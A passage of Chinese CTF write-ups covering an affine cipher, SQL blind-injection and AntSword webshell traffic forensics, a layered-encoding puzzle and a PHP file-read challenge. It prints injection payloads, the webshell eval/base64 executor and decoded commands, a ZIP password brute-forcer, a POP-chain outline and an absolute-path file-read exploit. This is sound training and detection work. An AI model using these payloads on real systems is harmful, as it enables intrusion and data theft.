        return m, 0, 1
    g, x1, y1 = extended_gcd(m % a, a)
    return g, y1 - (m // a) * x1, x1

def mod_inverse(a, m):
    """求 a 模 m 的乘法逆元"""
    g, x, _ = extended_gcd(a % m, m)
    if g != 1:
        raise ValueError(f'{a} 和 {m} 不互素，无模逆元')
    return x % m

# 求模逆元
a_inv = mod_inverse(a, m)
print(f'a_inv = {a_inv}')  # 19

# 解密: D(y) = a_inv * (y - b) mod m
plaintext = ''.join(
    chr((a_inv * (ord(ch) - ord('a') - b)) % m + ord('a'))
    for ch in CIPHERTEXT
)
print(f'明文: {plaintext}')  # sorcery

# Base64 编码
flag = base64.b64encode(plaintext.encode()).decode()
print(f'Flag: flag{{{flag}}}')
```

### 运行结果

```
仿射密码: E(x) = 11x + 6 (mod 26)
密文: welcylk

[1] 扩展欧几里得算法:
    gcd(11, 26) = 1 (必须为1，否则不可解)
    11 的模逆元 a_inv = 19
    验证: 11 * 19 mod 26 = 1
    解密公式: D(y) = 19 * (y - 6) mod 26

[2] 解密:
    密文: welcylk
    明文: sorcery

[3] 加密验证:
    明文: sorcery
    加密: welcylk
    匹配: True

[4] Base64 编码:
    明文: sorcery
    Base64: c29yY2VyeQ==

Flag: flag{c29yY2VyeQ==}
```

Flag: `flag{c29yY2VyeQ==}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 仿射密码 | `E(x) = ax + b (mod m)`，凯撒密码的推广，结合乘法密码与加法密码 |
| 模逆元 | `a * a_inv ≡ 1 (mod m)`，解密的关键，需 `gcd(a, m) = 1` |
| 扩展欧几里得算法 | 求 gcd 同时求 Bezout 系数，用于计算模逆元 |
| gcd 互素条件 | `gcd(a, m) = 1` 是仿射密码可逆的充要条件 |
| Base64 编码 | 将字节序列编码为 ASCII 字符，CTF 常见的 flag 包装格式 |
| 模运算 | 负数取模需注意：`-38 mod 26 = 14`（不是 -12），Python 的 `%` 自动处理 |

> **技巧**：识别仿射密码——看到 `e(x) = ax + b (mod m)` 形式就是仿射密码。解题三步走：①验证 `gcd(a,m)=1` → ②扩展欧几里得求 `a_inv` → ③代入 `D(y) = a_inv * (y-b) mod m` 逐字符解密。

> **技巧**：Python 的 `%` 运算符对负数也返回非负结果（如 `-38 % 26 = 14`），所以解密公式可以直接写 `(a_inv * (y - b)) % m`，无需手动处理负数。C/C++/Java 则需加 `m` 再取模。

### 同类变体与扩展

- **已知 a, b 直接解**：本题形式，最简单
- **已知 a, b 未知（已知明文攻击）**：通过一对明文-密文列出方程组求解
- **唯密文攻击**：利用字母频率分析 + 暴力枚举 `a`（12 个候选值）和 `b`（26 个候选值），共 312 种可能
- **a 的有效值**：模 26 下与 26 互素的 a 有 φ(26) = 12 个（1,3,5,7,9,11,15,17,19,21,23,25），密钥空间 12×26 = 312
- **与 RSA 的联系**：RSA 解密也需要模逆元求 `d = e_inv mod φ(n)`，但模数极大，暴力不可行，必须用扩展欧几里得
- **Hill 密码**：仿射密码的矩阵推广版，`E(x) = Kx + b (mod m)`，K 为矩阵，逆元变为逆矩阵

---

## 第17题：流量分析 — SQL 盲注流量还原

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - 流量分析 / Forensics |
| 难度 | 中等 |
| 日期 | 2026-08-01 |
| 附件 | 流量分析.pcap（2.5MB，16836 个包） |

### 题目内容

提供一个 `.pcap` 网络流量抓包文件，要求从中还原出攻击者提取的数据（flag）。

### 解题思路

**1. 流量概览**

```
总包数: 16836
协议: 全部 TCP
通信: 127.0.0.1 → 127.0.0.1 (本地环回)
端口: 客户端随机端口 → 服务器 80 端口
```

全是本地 HTTP 流量，客户端用 `python-requests/2.28.1` 发送请求。

**2. 识别攻击模式**

提取 HTTP 请求发现 1403 个注入请求，全部指向 `/comments.php?name=`：

```http
GET /comments.php?name=if((substr((select(text)from(wfy_comments)where(id=100)),1,1)="q"),100,0) HTTP/1.1
```

这是一个典型的 **SQL 布尔盲注（Boolean-Based Blind SQL Injection）**：

```
if(substr(目标字符, 位置, 1) = "候选字符", 100, 0)
```

- 条件为 **true** → 返回 100 条评论（响应体更大）
- 条件为 **false** → 返回 0 条评论（响应体更小）

攻击者从 `wfy_comments` 表 `id=100` 记录的 `text` 字段逐字符提取 flag。

> **⚠️ 识别要点**：看到 `substr(..., pos, 1) = "char"` 配合 `if(..., 100, 0)` 模式，就是布尔盲注逐字符爆破。关键在于如何区分 true/false 响应。

**3. 区分 true/false 响应（核心难点）**

HTTP 响应使用 `Content-Encoding: gzip` + `Transfer-Encoding: chunked` 双重编码，不能直接用原始字节长度判断。

解压步骤：
```
原始响应 → 找 \r\n\r\n 分隔头部和body → 提取chunk
→ 解析 hex chunk size → 取 chunk content → gzip解压 → 得到HTML
```

解压后统计 content 长度：
- **false 响应**（0 条评论）：content_len = 830（1164 次，大多数）
- **true 响应**（100 条评论）：content_len = 841 或 842（共 42 次）

分界线：`content_len > 830` 即为 true。

> **技巧**：流量分析题中，gzip + chunked 编码会导致原始字节长度差异很小（705-714字节），直接用原始长度判断容易误判。**必须解压后再比较内容长度**，差异才清晰（830 vs 842）。

**4. 逐字符还原**

对每个位置 `pos`（1~42），取 content_len 最大的字符（即 true 字符），按位置拼接：

```
pos 1: f (842) ← f 是第1位正确的字符
pos 2: l (842)
pos 3: a (842)
pos 4: g (842)
pos 5: { (842)
...
pos 42: } (842)
```

### 解题脚本

```python
from scapy.all import rdpcap
import re, gzip
from urllib.parse import unquote

pkts = rdpcap('流量分析.pcap')

# 按源端口配对请求和响应
streams = {}
for p in pkts:
    if p.haslayer('TCP') and p.haslayer('Raw'):
        tcp = p['TCP']
        if tcp.dport == 80:    # 请求
            streams.setdefault(tcp.sport, {})['req'] = tcp['Raw'].load.decode('utf-8', errors='replace')
        elif tcp.sport == 80:  # 响应
            streams.setdefault(tcp.dport, {})['resp_raw'] = tcp['Raw'].load

# 解析注入参数 + 解压响应
results = {}
for data in streams.values():
    m = re.search(r'substr\(\(select\(text\)from\(wfy_comments\)where\(id=(\d+)\)\),(\d+),1\)=%22(.+?)%22', data.get('req', ''))
    if not m:
        continue
    rid, pos, char = int(m.group(1)), int(m.group(2)), unquote(m.group(3))

    # 解压 gzip + chunked 响应
    resp = data.get('resp_raw', b'')
    header_end = resp.find(b'\r\n\r\n')
    if header_end < 0:
        continue
    body = resp[header_end + 4:]
    crlf = body.find(b'\r\n')
    try:
        chunk_size = int(body[:crlf].decode('ascii'), 16)
        content = gzip.decompress(body[crlf + 2:crlf + 2 + chunk_size])
        content_len = len(content)
    except:
        content_len = 0

    results.setdefault((rid, pos), []).append((char, content_len))

# 还原 flag: 取每个位置 content_len 最大的字符
flag_chars = {}
for (rid, pos), chars in results.items():
    if rid != 100:
        continue
    true_chars = [(c, l) for c, l in chars if l > 830]  # >830 为 true
    if true_chars:
        flag_chars[pos] = max(true_chars, key=lambda x: x[1])[0]

min_pos, max_pos = min(flag_chars), max(flag_chars)
flag = ''.join(flag_chars.get(p, '?') for p in range(min_pos, max_pos + 1))
print(f'Flag: {flag}')
```

### 运行结果

```
总包数: 16836
注入请求数: 1403
(id=100, pos) 组合: 42 个位置

content_len 分布:
  830 (false): 1164 次
  841/842 (true): 42 次

Flag (1-42): flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}
```

Flag: `flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PCAP 流量分析 | 使用 scapy/tshark 解析网络抓包文件，提取 HTTP 请求和响应 |
| SQL 布尔盲注 | `if(condition, true_value, false_value)` 根据条件返回不同数据量 |
| TCP 流重组 | 按源端口配对请求和响应包，还原完整的 HTTP 交互 |
| gzip + chunked 解码 | HTTP 响应双重编码，需先解析 chunk size 再 gzip 解压才能比较真实内容 |
| 响应大小区分 true/false | 布尔盲注的 true/false 通过响应体大小区分，注意编码压缩会缩小差异 |
| scapy 库 | Python 网络包分析库，`rdpcap()` 读取 pcap，`p['TCP']`/`p['Raw']` 访问各层 |

> **技巧**：流量分析题三步走：①全局概览（包数/协议/IP对/端口）→ ②识别攻击模式（SQL注入/XSS/上传/爆破）→ ③提取关键数据（请求参数 + 响应内容）。布尔盲注还原的核心是找到 true/false 的**内容长度分界线**。

> **技巧**：HTTP 响应如果是 gzip + chunked 编码，原始字节长度的差异可能只有几个字节（如 705 vs 712），但解压后内容长度差异会更大（如 830 vs 842）。**先解压再比较**，不要只看原始长度。

### 同类变体与扩展

- **时间盲注流量**：`if(condition, sleep(5), 0)`，通过响应时间区分 true/false，需分析时间戳而非内容大小
- **UNION 注入流量**：直接在响应体中可见数据，提取更简单，无需逐字符还原
- **文件上传流量**：查找 `Content-Type: multipart/form-data`，提取上传的文件内容
- **HTTPS 流量**：如果 pcap 含 TLS 握手且有的私钥，可解密后按 HTTP 分析；否则无法查看加密内容
- **工具推荐**：Wireshark 图形界面可右键 → Follow → HTTP Stream 逐流查看，适合少量流量的手动分析
- **大流量优化**：本题 16836 包用 scapy 纯 Python 解析约需 5-10 秒，超大 pcap 可用 tshark 预过滤 `-Y http` 减少数据量

---

## 第18题：SimpleFlow — 蚁剑 Webshell 流量分析

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR/应急响应 - 流量分析 |
| 难度 | 中等 |
| 日期 | 2026-08-01 |
| 附件 | SimpleFlow.pcapng（417 个包） |

### 题目内容

提供一个 `.pcapng` 网络流量抓包文件，要求分析攻击者的操作并提取 flag。

### 解题思路

**1. 流量概览**

```
总包数: 417
协议: Ethernet / IP / TCP / UDP / DNS / ARP
关键端口: 8888 (HTTP, 150包) — 攻击目标
目标服务器: 192.168.0.104:8888 (Apache/PHP 7.4.21, macOS Darwin)
攻击源: 10.211.55.8
DNS: 查询了 www.google.com
```

**2. 识别攻击工具：蚁剑 (AntSword)**

端口 8888 的 HTTP POST 请求具有典型的**蚁剑 Webshell 流量特征**：

```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

a=%40eval(%40base64_decode($_POST['ccb0f0a10c7efb']))&ccb0f0a10c7efb=QGluaV9zZXQo...
```

特征识别：
- `@ini_set("display_errors","0")` + `@set_time_limit(0)` 开头
- `@eval(@base64_decode($_POST['xxx']))` 执行器
- 随机参数名（如 `ccb0f0a10c7efb`）携带 Base64 编码的 PHP 代码
- 响应前后有随机 hex 标记（如 `8c2ce0` + 内容 + `bbd22973`）

> **⚠️ 蚁剑流量识别要点**：①PHP的 `@eval(@base64_decode())` 执行器 ②随机POST参数名 ③响应体前后各12位hex标记 ④User-Agent随机伪造（每请求不同浏览器）

**3. 解码蚁剑 payload**

蚁剑的命令执行 payload 结构：

```
参数1 (a): @eval(@base64_decode($_POST['随机名']))  ← 执行器
参数2 (随机名): Base64编码的PHP代码                  ← 实际payload
参数3 (o1faebd4ec3d97): /bin/sh                     ← shell路径
参数4 (g479cf6f058cf8): cd "..."; 命令; echo [S]; pwd; echo [E]  ← 实际命令
```

解码步骤：URL解码 → 提取Base64参数 → Base64解码 → 查看命令

**4. 还原完整攻击时间线**

| 步骤 | 端口 | 命令 | 响应 |
|------|------|------|------|
| ① 探测 | 57768~57770 | 获取服务器信息 (uname/pwd/whoami) | `/Users/chang/Sites/test` Darwin x86_64 chang |
| ② 列目录 | 57774 | `ls /Users/chang/Sites/` | mess/ test/ air/ rips/ CMS/ ... |
| ③ 读flag | 57783 | `head -n ../flag.txt` | 报错：illegal line count（缺少行数） |
| ④ 读flag | 57785 | `head -n 2 ../flag.txt` | "Yes,this is the flag file. And the flag is:" |
| ⑤ 打包 | 57797 | `zip -P PaSsZiPWorD flag.zip ../flag.txt` | "adding: ../flag.txt (deflated 10%)" |
| ⑥ 下载 | 57799 | `readfile('flag.zip')` | 返回 ZIP 二进制数据 (PK\x03\x04) |

> **⚠️ 关键发现**：步骤⑤的 `zip -P PaSsZiPWorD` 明文包含了ZIP密码！攻击者在命令行中直接用 `-P` 参数指定密码，被流量完整记录。

**5. 提取并解压 ZIP**

从步骤⑥的响应中提取 ZIP 二进制数据（`PK\x03\x04` 头到 `PK\x05\x06` 尾），用密码 `PaSsZiPWorD` 解压：

```python
zf = zipfile.ZipFile(io.BytesIO(zip_data))
content = zf.read('../flag.txt', pwd=b'PaSsZiPWorD')
# Yes,this is the flag file.
# And the flag is:
# DASCTF{f3f32f434eddbc6e6b5043373af95ae8}
```

> **技巧**：步骤④用 `head -n 2` 只读到了flag的前两行说明文字，实际的flag值在第三行。必须通过解压 ZIP 才能获得完整内容。这说明**流量分析不仅要看命令，还要提取传输的文件**。

### 解题脚本

```python
from scapy.all import rdpcap
from urllib.parse import unquote
import base64, re, io, zipfile

pkts = rdpcap('SimpleFlow.pcapng')

# TCP流重组
streams = {}
for p in pkts:
    if p.haslayer('TCP') and p.haslayer('Raw'):
        tcp = p['TCP']
        if tcp.dport == 8888:
            streams.setdefault(tcp.sport, {})['req'] = tcp['Raw'].load.decode('utf-8', errors='replace')
        elif tcp.sport == 8888:
            streams.setdefault(tcp.dport, {}).setdefault('resp', b'')
            streams[tcp.dport]['resp'] += tcp['Raw'].load

# 解码每个请求的命令参数
commands = {}
zip_data = None
for port, data in streams.items():
    req = data.get('req', '')
    if 'POST' not in req:
        continue
    body_start = req.find('\r\n\r\n')
    body = req[body_start + 4:].strip()

    # 解析POST参数
    params = {}
    for pair in body.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            params[k] = unquote(v)

    # 找命令参数（base64解码）
    for v in params.values():
        if len(v) > 12 and v[2:].replace('=', '').isalnum():
            try:
                decoded = base64.b64decode(v[2:]).decode('utf-8', errors='replace')
                if 'cd ' in decoded and 'echo [S]' in decoded:
                    cmd = re.search(r'"([^"]+)";(.+?);echo', decoded)
                    if cmd:
                        commands[port] = cmd.group(2)
                    # 提取ZIP密码
                    if 'zip -P' in decoded:
                        pwd = re.search(r'zip -P (\S+)', decoded)
                        if pwd:
                            commands[port] = f'ZIP_PASSWORD={pwd.group(1)}'
            except:
                pass

    # 检测ZIP文件下载
    resp = data.get('resp', b'')
    if b'PK\x03\x04' in resp:
        pk_start = resp.find(b'PK\x03\x04')
        eocd = resp.find(b'PK\x05\x06')
        if eocd >= 0:
            zip_data = resp[pk_start:eocd + 22]

# 输出攻击时间线
for port in sorted(commands.keys()):
    print(f'port={port}: {commands[port]}')

# 解压ZIP获取flag
if zip_data:
    zf = zipfile.ZipFile(io.BytesIO(zip_data))
    content = zf.read('../flag.txt', pwd=b'PaSsZiPWorD')
    print(f'\nFlag: {content.decode().strip().split(chr(10))[-1]}')
```

### 运行结果

```
=== SimpleFlow 蚁剑流量分析 ===

攻击时间线:
  [1] 列目录: mess/ test/ air/ rips/ CMS/ ...
  [2] head -n ../flag.txt → 报错（缺少行数参数）
  [3] head -n 2 ../flag.txt → "Yes,this is the flag file. And the flag is:"
  [4] zip -P PaSsZiPWorD flag.zip ../flag.txt → 压缩成功
  [5] readfile(flag.zip) → 下载ZIP二进制

ZIP密码: PaSsZiPWorD

../flag.txt 内容:
Yes,this is the flag file.
And the flag is:
DASCTF{f3f32f434eddbc6e6b5043373af95ae8}
```

Flag: `DASCTF{f3f32f434eddbc6e6b5043373af95ae8}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 蚁剑 (AntSword) | 开源 Webshell 管理工具，流量特征为 `@eval(@base64_decode())` + 随机参数名 |
| Webshell 流量特征 | 随机UA、Base64编码payload、响应前后hex标记、POST到固定URL |
| TCP 流重组 | 按源端口配对请求响应，可能需跨多个TCP包拼接完整数据 |
| chunked 传输解码 | HTTP响应使用 `Transfer-Encoding: chunked`，需解析hex chunk size提取内容 |
| 蚁剑命令执行结构 | shell路径参数 + 命令参数(base64) + 环境变量参数，命令格式 `cd "..."; 命令; echo [S]; pwd; echo [E]` |
| ZIP加密文件提取 | 流量中 `zip -P password` 明文包含密码，从后续HTTP响应提取ZIP二进制并用密码解压 |
| 二进制文件提取 | HTTP响应中的 `PK\x03\x04` 头到 `PK\x05\x06` 尾即为完整ZIP文件 |

> **技巧**：蚁剑流量分析四步走：①识别蚁剑特征（`@eval(@base64_decode())`）→ ②解码Base64 payload看命令 → ③从响应中提取hex标记之间的内容 → ④关注文件操作（cat/zip/download）提取传输的文件内容

> **技巧**：命令执行类Webshell的密码和敏感数据常在命令行明文传输。`zip -P`、`mysql -p`、`sshpass -p` 等命令的 `-P`/`-p` 参数直接暴露密码。**流量分析时搜索 `-P `、`-p `、`password=` 等关键词**。

### 同类变体与扩展

- **哥斯拉 (Godzilla)**：另一种流行Webshell管理工具，流量特征为 `pass=php://filter/convert.base64-decode/resource=` 或 Java序列化数据
- **冰蝎 (Behinder)**：流量加密（AES），需提取密钥才能解密，特征为固定的Content-Type和加密的payload
- **菜刀 (Chopper)**：蚁剑的前身，流量更简单，`z0=base64` 直接解码即可
- **无文件Webshell**：内存马，流量中无文件路径，需关注异常的Java反射或ClassLoader调用
- **防御建议**：WAF规则检测 `@eval`、`@base64_decode`、`@ini_set("display_errors"` 等蚁剑特征字符串；监控异常POST请求频率和随机UA
- **pcapng vs pcap**：pcapng 是新一代格式，支持多接口和时间戳精度更高，scapy 的 `rdpcap()` 两者都支持

---

## 第19题：easyencode — 五层嵌套编码

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Crypto - 多层编码 |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 题目文件 | `easyencode.zip`（345字节，ZipCrypto加密） |

### 编码链路总览

```
easyencode.zip (ZIP密码: 100861)
  └─ encode.txt (3124字节摩斯电码)
       └─ [Layer 1] 摩斯电码解码 → 528字符hex字符串
            └─ [Layer 2] Hex解码 → 264字符 \uXXXX Unicode转义序列
                 └─ [Layer 3] Unicode转义解码 → 44字符 Base64+URL编码
                      └─ [Layer 4] URL解码 (%3D→=) → 标准Base64
                           └─ [Layer 5] Base64解码 → flag
```

### 解题过程

**1. ZIP暴力破解**

ZIP 文件使用 ZipCrypto 传统加密（非 AES）。文件仅 345 字节，含一个 `encode.txt`（原始大小 3124 字节）。

排除伪加密后，对 6 位纯数字密码进行暴力枚举：

```python
import zipfile, itertools

with zipfile.ZipFile('easyencode.zip', 'r') as z:
    for combo in itertools.product('0123456789', repeat=6):
        pwd = ''.join(combo).encode()
        try:
            z.setpassword(pwd)
            z.read('encode.txt')
            print(f"Password: {pwd.decode()}")
            break
        except:
            continue
# 密码: 100861
```

> **技巧**：CTF 中 ZIP 密码常见为纯数字（手机号、短数字）。6 位数字仅 100 万种组合，Python `itertools.product` 几秒内可枚举完毕。

**2. 第一层：摩斯电码解码**

解压后的 `encode.txt` 内容全部是摩斯电码（`.` 和 `-`，空格分隔）：

```
..... -.-. --... ..... ...-- ----- ...-- ----- ...-- ..... ...-- ..--- .....
```

摩斯解码使用标准码表。注意本题摩斯码只使用了数字 `0-9` 和字母 `C`（`-.-.`）：

```python
MORSE_CODE = {
    '.....': '5', '-.-.': 'C', '--...': '7', '...--': '3',
    '-----': '0', '....-': '4', '..---': '2', '-....': '6',
    # ... 完整码表
}
decoded = ''.join(MORSE_CODE[m] for m in morse_text.split(' '))
# 结果: 5C75303035325C75303034375C75303035365C75303037615C...
# 长度: 528 字符，全部为 hex 字符 (0-9, A-F 中的 C)
```

> **技巧**：摩斯电码中只出现数字和少数字母时，解码结果很可能是 hex 编码。`5C` = `\`、`75` = `u` 是 Unicode 转义 `\u` 的典型开头，是识别下一层编码的关键线索。

**3. 第二层：Hex 解码**

528 字符 hex 字符串每 2 位一组，解码为 264 字节 ASCII 文本：

```python
hex_bytes = bytes.fromhex(decoded_morse)
unicode_escaped = hex_bytes.decode('ascii')
# 结果: \u0052\u0047\u0056\u007a\u0064\u0044\u0042\u006e\u004d\u0033\u0074\u0045...
```

Hex 解码后得到的是 `\uXXXX` 格式的 Unicode 转义序列，每 6 个字符（`\u` + 4位hex）表示一个字符。

**4. 第三层：Unicode 转义解码**

将 `\uXXXX` 转义序列逐个转换为实际字符：

```python
import re
result = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), unicode_escaped)
# 结果: RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D
```

解码后得到 44 字符的字符串，看起来像 Base64 但末尾是 `%3D%3D` 而非 `==`。

> **技巧**：`\uXXXX` 是 JavaScript/Python/Java 中常见的 Unicode 转义格式。正则 `\\u([0-9a-fA-F]{4})` 可批量匹配并转换。注意 Python 字符串中 `\u` 本身是转义前缀，处理时需用原始字符串 `r'\u'` 或双反斜杠 `\\u`。

**5. 第四层：URL 解码**

`%3D` 是 `=` 的 URL 百分号编码。Base64 的填充字符 `=` 被 URL 编码了：

```python
import urllib.parse
b64_str = urllib.parse.unquote('RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D')
# 结果: RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==
```

> **技巧**：URL 百分号编码常用于隐藏 Base64 的 `=` 填充符。`%3D` = `=`、`%2B` = `+`、`%2F` = `/` 是 Base64 字符集中常被 URL 编码的三个字符。看到以 `%3D%3D` 结尾的字符串应立即联想到 URL 编码的 Base64。

**6. 第五层：Base64 解码**

标准 Base64 解码得到最终 flag：

```python
import base64
flag = base64.b64decode('RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==').decode('utf-8')
# 结果: Dest0g3{Deoding_1s_e4sy_4_U}
```

### 验证

```
Layer 1 (Morse):    5C75303035325C7530303437...  (528 chars)
Layer 2 (Hex):      \u0052\u0047\u0056\u007a...  (264 chars)
Layer 3 (Unicode):  RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D  (44 chars)
Layer 4 (URL):      RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==  (44 chars)
Layer 5 (Base64):   Dest0g3{Deoding_1s_e4sy_4_U}  ✓
```

Flag: `Dest0g3{Deoding_1s_e4sy_4_U}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| ZIP 暴力破解 | ZipCrypto 传统加密，6 位纯数字密码可通过 `itertools.product` 快速枚举 |
| 摩斯电码 (Morse Code) | 点划编码，数字 0-9 和字母 A-Z 各有唯一编码；本题仅用数字+字母C |
| Hex 编码 | 每 2 个 hex 字符表示 1 字节，`5C`=`\`、`75`=`u` 是识别 Unicode 转义的关键 |
| Unicode 转义 `\uXXXX` | 4 位 hex 表示 Unicode 码点，常见于 JS/Python/Java 字符串 |
| URL 百分号编码 | `%XX` 格式，`%3D`=`=`、`%2B`=`+`、`%2F`=`/`，常隐藏 Base64 特殊字符 |
| Base64 编码 | 3 字节→4 字符，`=` 为末尾填充，`+` 和 `/` 为扩展字符 |

> **技巧**：多层编码题的通用解题策略——**从外到内逐层剥离**。每层解码后先观察结果特征（字符集、长度、结构），再判断下一层编码类型。关键识别特征：① 全 hex 字符→Hex解码；② `\uXXXX` 模式→Unicode转义；③ `%XX` 模式→URL解码；④ `[A-Za-z0-9+/=]` 字符集→Base64解码。

> **技巧**：题名是最好的提示。`easyencode` 强调"编码"而非"加密"，意味着无需密钥的编码链，关键是识别每层编码类型。类似题名还有 `encode`、`encoding`、`base` 等。

### 同类变体与扩展

- **编码层数变化**：常见 2-5 层嵌套，可能加入 Base32、Base58、ROT13、AAencode（JS颜文字编码）、Brainfuck 等冷门编码
- **UUencode/XXencode**：较老的二进制转文本编码，字符集不同于 Base64
- **摩斯电码变体**：分隔符可能用 `/` 或换行而非空格；可能包含标点符号摩斯码
- **Hex 变体**：可能用 `0x` 前缀、`\x` 前缀、或空格分隔的 hex
- **防御/检测**：多层编码是恶意软件混淆 payload 的常见手段，YARA 规则可检测 base64/hex 链式编码特征

### 解题脚本

完整脚本：[Crypto/19-easyencode/solve.py](Crypto/19-easyencode/solve.py)

```python
# 核心解码链（5层）
import zipfile, re, base64, urllib.parse

# Layer 0: ZIP解压 (密码: 100861)
with zipfile.ZipFile('easyencode.zip', 'r') as z:
    z.setpassword(b'100861')
    morse_text = z.read('encode.txt').decode('utf-8')

# Layer 1: 摩斯电码 → hex字符串
MORSE = {'.....': '5', '-.-.': 'C', '--...': '7', '...--': '3', '-----': '0', ...}
hex_str = ''.join(MORSE[m] for m in morse_text.split(' '))

# Layer 2: Hex解码 → \uXXXX Unicode转义
unicode_escaped = bytes.fromhex(hex_str).decode('ascii')

# Layer 3: Unicode转义解码 → Base64+URL编码
b64_url = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), unicode_escaped)

# Layer 4: URL解码 → 标准Base64
b64_str = urllib.parse.unquote(b64_url)

# Layer 5: Base64解码 → flag
flag = base64.b64decode(b64_str).decode('utf-8')
print(flag)  # Dest0g3{Deoding_1s_e4sy_4_U}
```

---

## 第20题：文件上传 — 任意文件读取 (LFI)

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - 文件上传 + 任意文件读取 |
| 难度 | 入门 |
| 日期 | 2026-08-02 |
| 题目URL | `https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/` |

### 题目页面

页面有两个功能模块：
- **图片查看**：通过 `file.php?f=<文件名>` 读取文件内容
- **图片上传**：通过 `upload.php` 上传文件（POST multipart/form-data）

### 源码审计

通过 `file.php` 读取三个 PHP 文件源码（`file.php`、`upload.php`、`class.php`）：

**file.php**（文件读取接口）：

```php
$filename = $_GET['f'];
$show = new Show($filename);
$show->show();
```

**class.php** — `Show::show()`（核心漏洞点）：

```php
class Show {
    public function show() {
        if(preg_match('/http|https|file:|php:|gopher|dict|\.\./i', $this->source)) {
            die('illegal fname :P');
        } else {
            echo file_get_contents($this->source);
            // ... 输出 base64 图片
        }
    }
}
```

**class.php** — `Upload::file_check()`（上传过滤逻辑）：

```php
function file_check() {
    $allowed_types = array("png");
    $temp = explode(".", $this->f["file"]["name"]);
    $extension = end($temp);
    // 扩展名白名单：只允许 png
    
    $filter = '/<\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i';
    // 内容黑名单：禁止 <?php、php、exec、system 等关键字
    if(preg_match_all($filter, $f)) {
        echo 'what are you doing!! :C';
        return false;
    }
}
```

### 漏洞分析

**主要漏洞：`file.php` 任意文件读取（LFI）**

`Show::show()` 中 `file_get_contents($this->source)` 的过滤存在缺陷：

| 过滤内容 | 绕过方式 |
|---------|---------|
| `http` / `https` | 不使用网络协议 |
| `file:` / `php:` | 不使用协议封装器 |
| `gopher` / `dict` | 不使用协议封装器 |
| `..` (目录穿越) | 使用绝对路径，不需要 `..` |
| **绝对路径（未过滤）** | **直接读取 `/flag`** |

> **关键**：过滤了协议封装器和 `..` 目录穿越，但**完全没有限制绝对路径**。这意味着可以直接用 `file.php?f=/flag` 读取根目录下的 flag 文件。

**备选攻击面：POP 链反序列化（未使用但值得记录）**

`class.php` 中存在一条完整的 POP 链，可通过文件上传触发：

```
Test::__destruct()       → echo $this->str  ($str = Upload对象)
  → Upload::__toString() → echo $this->fname->$this->fsize  ($fname = Show对象)
    → Show::__get($fsize) → $this->ok($fsize)  (ok方法不存在)
      → Show::__call('ok', [$fsize]) → backdoor(end($arguments))
        → include($door)  ← 包含上传的 png 文件执行代码
```

`Upload::file_check()` 虽然禁止了 `<?php` 等关键字，但可以通过以下方式绕过：
- `<?= ?>` 短标签（如果短标签开启）
- `.htaccess` / `.user.ini` 修改解析方式
- 利用 `include()` 特性：不需要 `<?php` 标签也能执行（但需要 PHP 代码块标识）

### 解题过程

**最短路径：直接读取 /flag**

```
GET /file.php?f=/flag
```

利用 `file_get_contents` 无绝对路径限制的缺陷，直接读取系统根目录下的 flag 文件：

```python
import requests

r = requests.get("https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/file.php?f=/flag")
# 响应: CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}<img src=data:jpg;base64,... />
flag = r.text.split('<img')[0].strip()
print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
```

**利用过程：**

```
[1] 访问首页 → 发现"图片查看"和"图片上传"两个功能
[2] file.php?f=upload.php → 读取上传处理源码
[3] file.php?f=class.php  → 读取核心类定义 → 发现 file_get_contents 未过滤绝对路径
[4] file.php?f=/flag      → 直接读取 flag
```

Flag: `CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 任意文件读取 (LFI) | `file_get_contents()` 接收用户输入但未限制路径，可读取任意文件 |
| PHP 协议过滤缺陷 | 过滤了 `http/https/file:/php:/gopher/dict` 但遗漏绝对路径 |
| 文件上传白名单+黑名单 | 扩展名白名单(`png`) + 内容黑名单(`<?php\|exec\|system` 等) |
| POP 链 (反序列化) | `__destruct→__toString→__get→__call→backdoor→include`，备选攻击路径 |
| `include()` 执行 | `backdoor()` 中 `include($door)` 可执行 PHP 文件，需绕过内容过滤 |

> **技巧**：文件上传题先审源码再动手。通过 `file.php` 等读取接口获取服务器端 PHP 源码，往往能发现比上传更简单的攻击路径（如本题的 LFI 直接读 flag）。

> **技巧**：`file_get_contents()` 的路径过滤常见缺陷：① 只过滤 `..` 不限绝对路径；② 只过滤 `http://` 不过滤 `/`；③ 遗漏 `php://filter`（本题过滤了 `php:`）；④ 未过滤 `data://` 协议。CTF 中遇到 `file_get_contents` 优先测试绝对路径和协议封装器。

> **技巧**：PHP 类中的魔术方法链（`__destruct→__toString→__get→__call`）是反序列化利用的核心。即使题目没有显式的 `unserialize()`，也可能通过 `phar://` 协议触发反序列化（`file_get_contents` 支持 `phar://`）。

### 同类变体与扩展

